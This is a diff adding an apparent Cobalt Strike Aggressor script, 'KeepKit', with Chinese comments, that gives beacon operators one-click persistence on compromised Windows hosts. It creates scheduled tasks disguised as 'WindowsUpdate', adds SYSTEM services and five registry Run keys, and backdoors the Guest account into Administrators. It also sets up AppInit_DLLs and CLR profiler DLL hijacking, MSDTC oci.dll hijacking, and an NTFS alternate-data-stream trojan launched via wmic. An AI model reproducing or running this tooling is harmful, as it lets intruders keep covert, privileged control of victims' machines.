@@ -1,0 +1,388 @@
+
+#创建计划任务函数
+sub Add-Schtasks  {
+  $bid = $1;
+  $dialog = dialog("Run exe Or Run Command", #窗口名称
+  %(taskname => "WindowsUpdate", targetpath => "", user => "administrator", payloadfile => "", min => "1"),  #这是会话框提示，必须
+  lambda({
+      #bupload($bid, $3['payloadfile']);
+      bshell($bid, 'cmd /c schtasks /create /sc minute /mo "'.$3['min'].'" /F /tn "'.$3['taskname'].'" /tr "'.$3['targetpath'].'" /ru "'.$3['user'].'" ');      #修改自定义的计划任务命令
+  }));
+ 
+  dialog_description($dialog, "Command===> \"            must2            \\\"");
+  
+  drow_text($dialog, "taskname",  "TaskName:");       #设置计划任务的名称
+  drow_text($dialog, "user", "User:");              #运行程序用户的名称
+  drow_text($dialog, "targetpath", "pathORcmd:");          #上传到目标
+  #drow_file($dialog, "payloadfile", "exe Payload:");    #木马上传
+  drow_text($dialog, "min", "minute:");		#运行间隔分钟数
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+
+#删除计划任务函数
+sub Del-Schtasks  {
+  $bid = $1;
+  $dialog = dialog("delete schtasks", #窗口名称
+  %(schtasksName => "WindowsUpdate"),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'schtasks /delete /F /tn "'.$3['schtasksName'].'"');
+  }));
+  
+  dialog_description($dialog, "Enter Your Schtask Name");
+  drow_text($dialog, "schtasksName",  "schtasksName:");
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+      }
+
+
+
+#创建自定义服务函数
+sub addscservice{
+  $bid = $1;
+  $dialog = dialog("Create service", #窗口名称
+  %(serviceName => "", command => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd.exe /c sc create "'.$3['serviceName'].'" binpath= "'.$3['command'].'" start= auto error= ignore' );      #默认以system权限启动
+	  bshell($bid, 'cmd.exe /c sc start "'.$3['serviceName'].'"');
+  }));
+  
+  dialog_description($dialog, "EXE Error. Must Command OR Powershell-YiJuHua:\(");
+  drow_text($dialog, "serviceName",  "serviceName:");       #设置服务的名称
+  drow_text($dialog, "command",  "command:");	#要执行的命令
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+      }
+
+#删除自定义服务函数
+sub delscservice{
+  $bid = $1;
+  $dialog = dialog("Delete Service", #窗口名称
+  %(serviceName => "", command => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd.exe /c sc delete "'.$3['serviceName'].'"' );
+  }));
+  
+  dialog_description($dialog, "Enter Your Service Name.");
+  drow_text($dialog, "serviceName",  "serviceName:");
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+      }
+
+
+
+#添加注册表自启项函数
+sub addregistry  {
+  $bid = $1;
+  $dialog = dialog("Registry-startuprun", #窗口名称
+  %(TargetPath => "", KeyName => "", Arch => "64"),  #这是会话框提示，必须。
+  lambda({
+      bcd($bid, $3['targetpath']);  
+      bshell($bid, 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "'.$3['KeyName'].'" /t reg_sz /d "'.$3['TargetPath'].'" /f /reg:64');
+	  #x64
+	  
+	  bshell($bid, 'reg ADD "hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "'.$3['KeyName'].'" /t reg_sz /d "'.$3['TargetPath'].'" /f /reg:64');
+
+	  
+	  bshell($bid, 'reg add "hklm\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "'.$3['KeyName'].'" /t reg_sz /d "'.$3['TargetPath'].'" /f /reg:64');
+	  
+	  bshell($bid, 'reg add "hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "'.$3['KeyName'].'" /t reg_sz /d "'.$3['TargetPath'].'" /f /reg:64');
+
+	  bshell($bid, 'reg add "hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "'.$3['KeyName'].'" /t reg_sz /d "'.$3['TargetPath'].'" /f /reg:64');
+	  
+  }));
+
+  dialog_description($dialog, "add 5 regkeysName");
+  
+  drow_text($dialog, "KeyName", "KeyName:");     #键名
+  drow_text($dialog, "TargetPath", "FilePath:");     #上传目标的路径
+  #drow_text($dialog, "Arch", "Arch:");     #架构
+  #drow_file($dialog, "LocalPayload", "Payload:");    #不要上传，自己手动上传
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#删除注册表启动项，手动删除比较麻烦，所以来了个一键删除
+sub delregistry  {
+  $bid = $1;
+  $dialog = dialog("Registry-del", #窗口名称
+  %(TargetPath => "", KeyName => "", LocalPayload => ""),  #这是会话框提示，必须。
+  lambda({
+      bcd($bid, $3['targetpath']);
+      bupload($bid, $3['LocalPayload']);
+	  bshell($bid, 'reg delete "hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "'.$3['KeyName'].'" /f /reg:64');
+	  
+	  bshell($bid, 'reg delete "hklm\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "'.$3['KeyName'].'" /f /reg:64');
+	  
+	  bshell($bid, 'reg delete "hklm\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "'.$3['KeyName'].'" /f /reg:64');
+	  
+	  bshell($bid, 'reg delete "hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "'.$3['KeyName'].'" /f /reg:64');
+	  
+	  bshell($bid, 'reg delete "hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "'.$3['KeyName'].'" /f /reg:64');
+	  
+  }));
+  dialog_description($dialog, "del 5 keys");
+  
+  drow_text($dialog, "KeyName", "KeyName:");     #键名
+  
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+}
+
+#guest后门函数（激活guest用户并将用户加入任意组）
+sub guestbk{
+  $bid = $1;
+  $dialog = dialog("Activate Guest And Join Administrator group", #窗口名称
+  %(admingroupname => "administrators", guestpass => ""),  #这是会话框提示，必须
+  lambda({
+	  bshell($bid, 'cmd.exe /c net user guest /active:yes');
+	  bshell($bid, 'cmd.exe /c net user guest "'.$3['guestpass'].'"');
+	  bshell($bid, 'cmd.exe /c net localgroup "'.$3['admingroupname'].'" guest /add');
+  }));
+  
+  dialog_description($dialog, "GuestHello");
+  drow_text($dialog, "admingroupname",  "GroupName:");
+  drow_text($dialog, "guestpass",  "GuestPass:");
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+      }
+
+#AppInitDLLs进程注入函数
+sub AddAppInitDLLs  {
+  $bid = $1;
+  $dialog = dialog("AppInitDLLs inject", #窗口名称
+  %(dllpath => "", LocalPayload => ""),  #这是会话框提示，必须。
+  lambda({
+      bcd($bid, $3['dllpath']);
+      #bupload($bid, $3['LocalPayload']);
+	  #开启功能-这个一定要在前
+      bshell($bid, 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f /reg:64');	#X64
+	  
+	  #指定恶意DLL，这个一定不能在功能开启前
+	  bshell($bid, 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t reg_sz /d "'.$3['dllpath'].'" /f /reg:64');	#X64
+	  
+  }));
+  dialog_description($dialog, "nbxcygdll,You Must Upload a DLL File.bie wen wo, wo bu zhi dao zen me chuan :)");
+  drow_text($dialog, "dllpath", "TargetPath:");     #dll路径，需先上传，再指定路径
+  #drow_file($dialog, "LocalPayload", "LocalDLL:"); #不要上传，自己手动上传
+
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+
+}
+
+#清除AppInitDLLs进程注入
+sub DelAppInitDLLs  {
+  $bid = $1;
+	  #删除恶意DLL-这个一定要在前
+      bshell($bid, 'reg delete "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /f /reg:64');	#X64
+	  
+	  #关闭功能，这个一定不能在删除前
+	  bshell($bid, 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x0 /f /reg:64');  	#X64
+	  
+  }
+
+#添加CLR劫持（需重启）
+sub AddCLR  {
+  $bid = $1;
+  $dialog = dialog("CLR inject", #窗口名称
+  %(dllpath => ""),  #这是会话框提示，必须。
+  lambda({
+      bcd($bid, $3['dllpath']);
+	  
+      bshell($bid, 'REG ADD "HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32" /ve /t REG_EXPAND_SZ /d "'.$3['dllpath'].'" /f /reg:64');	#X64
+	  	  
+	  bshell($bid, 'REG ADD "HKCU\\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f /reg:64');	#X64
+	  	  
+	  bshell($bid, 'REG ADD "HKCU\\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f /reg:64');	#X64
+	  
+  }));
+  dialog_description($dialog, "Enter Your DLL Path");
+  drow_text($dialog, "dllpath", "TargetPath:");
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+
+}
+
+
+#删除CLR劫持
+sub DelCLR  {
+	  $bid = $1;
+      bshell($bid, 'REG delete "HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /reg:64 /F');	#X64
+	  	  
+	  bshell($bid, 'REG delete "HKCU\\Environment" /v "COR_PROFILER" /reg:64 /F');	#X64
+	  
+	  bshell($bid, 'REG delete "HKCU\\Environment" /v "COR_ENABLE_PROFILING" /reg:64 /F');	#X64
+	  
+  }
+
+#创建MSDTC服务劫持
+sub AddMSDTC  {
+	$bid = $1;
+	 $dialog = dialog("MSDTC haject", #窗口名称
+	 %(dllpath => ""),
+	 lambda({
+      bshell($bid, 'sc start MSDTC');
+	  bshell($bid, 'sc config MSDTC start= auto');
+	}));
+	
+	dialog_description($dialog, "Make Sure Upload Your oci.dll 2 %windir%\system32%. Don't Use beacon_cmd upload.");
+	dbutton_action($dialog, "ok");
+	dialog_show($dialog);
+}
+
+
+#删除MSDTC服务劫持(CS对于架构不一样的beacon，在路径和注册表方面有’人性化‘的自动纠错，所以还是手动删除文件吧)
+sub DelMSDTC  {
+	$bid = $1;
+		bshell($bid, 'sc config MSDTC start= demand');
+		bshell($bid, 'sc stop MSDTC');
+	}
+
+#创建ADS流木马
+sub AddADS  {
+  $bid = $1;
+  $dialog = dialog("USE ...: Create ADS File", 
+  %(upload => "", filename => "C:\\windows\\system32\\" ), 
+  lambda({
+      bcd($bid, "C:\\windows\\system32");
+      bupload($bid, $3['upload']);
+      bshell($bid, 'cmd.exe /c type "'.$3['filename'].'" > ...:NTFS');
+	  bshell($bid, 'cmd.exe /c del /f  "'.$3['filename'].'" ');
+	  bshell($bid, 'cmd.exe /c wmic process call create C:\\windows\\system32\\...:NTFS');
+	  bshell($bid, 'cmd.exe /c wmic process call create C:\\windows\\syswow64\\...:NTFS');
+	  
+}));
+ 
+  dialog_description($dialog, "File upload to %windir\system32% OR %windir\SysWOW64%");
+  drow_file($dialog, "upload", "Upload:");    #木马上传
+  drow_text($dialog, "filename", "FileName:");    #木马上传
+  dbutton_action($dialog, "xxn");
+  dialog_show($dialog);
+
+}
+
+
+#菜单栏
+popup beacon_bottom {
+	menu "KeepKit"{
+		#计划任务菜单
+        menu "Schtasks" {
+		item "Add-Schtask"{
+        local('$bid');
+        foreach $bid ($1) {
+          Add-Schtasks($bid);
+        }}
+		item "Del-Schtask"{
+		local('$bid');
+        foreach $bid ($1) {
+		  Del-Schtasks($bid);
+        }
+		}
+		
+		}
+		
+		
+		#自定义服务菜单
+		menu "Service*"{
+		item "Add-Service"{
+		local('$bid');
+		foreach $bid ($1){
+			addscservice($bid);
+		}
+		}
+		item "Del-Service"{
+		local('$bid');
+		foreach $bid ($1){
+			delscservice($bid);
+		}
+		}
+		}
+		
+		#注册表菜单
+		menu "Registry*"{
+		item "Add-Registry"{
+		local('$bid');
+		foreach $bid ($1){
+			addregistry($bid);
+		}
+		}
+		item "Del-Registry"{
+		local('$bid');
+		foreach $bid ($1){
+			delregistry($bid);
+		}
+		}
+		}
+		
+		#Guest后门菜单
+		item "GuestBk*"{
+		local('$bid');
+		foreach $bid ($1){
+			guestbk($bid)
+		}
+		}
+		
+		#AppInit_DLLs注入菜单，劫持所有新开启的进程
+		menu "AppInitDLLs*"{
+		item "Add-AppInitDLLs"{
+		local('$bid');
+		foreach $bid ($1){
+			AddAppInitDLLs($bid)
+			}
+		}
+		item "Del-AppInitDLLs"{
+		local('$bid');
+		foreach $bid ($1){
+			DelAppInitDLLs($bid)
+			}
+		}
+		}
+		
+		#CLR劫持菜单（劫持Windows所有.net程序）
+		menu "CLRHijack*"{
+		item "Add-ClrHijack"{
+		local('$bid');
+		foreach $bid ($1){
+			AddCLR($bid)
+			}
+		}
+		item "Del-CLRHijack"{
+		local('$bid');
+		foreach $bid ($1){
+			DelCLR($bid)
+			}
+		}
+		}
+		
+		#MSDTC服务劫持
+		menu "MSDTC*"{
+		item "Add-MSDTC"{
+		local('$bid');
+		foreach $bid ($1){
+			AddMSDTC($bid)
+			}
+		}
+		item "Del-MSDTC"{
+		local('$bid');
+		foreach $bid ($1){
+			DelMSDTC($bid)
+			}
+		}
+		}
+		
+		#创建ADS流木马
+		item "ADS"{
+		local('$bid');
+		foreach $bid ($1){
+			AddADS($bid)
+		}
+		}
+		
+		
+}
+}
